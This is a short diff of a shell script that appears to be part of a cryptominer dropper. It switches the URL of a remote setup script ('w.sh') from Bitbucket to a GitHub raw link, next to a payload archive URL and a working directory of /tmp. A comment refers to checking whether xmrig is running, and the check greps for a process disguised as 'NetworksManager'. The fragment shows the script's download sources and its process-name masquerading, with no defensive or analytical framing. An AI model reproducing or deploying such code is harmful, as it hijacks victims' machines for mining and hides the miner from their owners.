@@ -2,7 +2,7 @@
 # find a good writable path
 workdir="/tmp"
 files="https://github.com/uzidlrxvs/fos/raw/main/dasdsa.tar.gz"
-setupurl="https://bitbucket.org/pennyparker/wqqwdq/downloads/w.sh"
+setupurl="https://github.com/uzidlrxvs/fos/raw/main/w.sh"
 
 # check if xmrig is runing
 if [[ $(ps -ef | grep NetworksManager | grep -v grep | wc -l) != 0 ]]; then
